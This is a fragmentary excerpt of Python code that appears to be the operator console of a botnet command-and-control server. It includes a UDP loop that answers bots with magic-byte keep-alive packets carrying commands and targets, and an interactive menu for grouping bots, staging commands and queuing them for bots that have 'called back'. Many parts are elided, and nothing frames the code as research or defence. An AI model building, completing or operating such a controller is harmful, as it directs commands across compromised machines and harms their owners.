    ...
    while True:
        ...
        if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
            try:
                ...
                packet = (
                    MAGIC_BYTES + KEEP_ALIVE_BYTE + b"\x01" + cmd_num + target_address
                )
                sock.sendto(packet, addr)
...
if __name__ == "__main__":
    ...
    mainCommandsDict = {
        "show": {
            ...
            "status": None,
            "groups": None,
            "responses": {"target": targetCompleter},
            "staged": {"commands": None},
        },
        "set": {
            "name": None,
            "target": {"group": groupCompleter, "list": targetCompleter},
            "command": None,
        },
        "del": {"group": groupCompleter},
        "create": {"group": None},
        "edit": {"group": groupCompleter},
        "clear": None,
        "stage": None,
    ...
    groupCommandsDict = {"add": targetCompleter}

    completer = NestedCompleter.from_nested_dict(mainCommandsDict)

    completerGroupEdit = NestedCompleter.from_nested_dict(groupCommandsDict)

    validatorMain = Validator.from_callable(
        is_valid_main, error_message="Invalid command", move_cursor_to_end=True,
    )

    validatorGroup = Validator.from_callable(
        is_valid_group, error_message="Invalid command", move_cursor_to_end=True,
    )
    ...
    try:
        while 1:
            ...
            if "show targets" in user_input:
                ...
                with patch_stdout():
                    with ProgressBar(
                        key_bindings=kb, bottom_toolbar=progress_bottom_bar
                    ) as pb:
                        for i in pb(
                            info(targetsInthisStage),
                            label="Commands Recieved by Bots",
                            total=targetsInthisStage,
                        ):
                            sleep(0.1)
                ...
                if len(s) > 1:
                    ...
                    for t in target.split(" "):
                        ...
                        try:
                            ...
                            print(
                                f"No responses currently from {t}. Try hitting enter a few times to refresh and run the command again."
                            )
                        ...
                        for exec_target in exec_targets:
                            if exec_target in groups:
                                for target in groups[exec_target]:
                                    try:
                                        executeCommands[target] += stagedCommands[
                                            stage
                                        ]["commands"]
                                    except KeyError:
                                        print(
                                            f"Cannot stage command for {target}, it has not called back."
                                        )
                            else:
                                try:
                                    executeCommands[exec_target] += stagedCommands[
                                        stage
                                    ]["commands"]
                                except KeyError:
                                    print(
                                        f"Cannot stage command for {exec_target}, it has not called back."
                                    )
                ...
                if (
                    stage_command_name == ""
                    or len(stage_commands) == 0
                    or len(stage_target) == 0
                ):
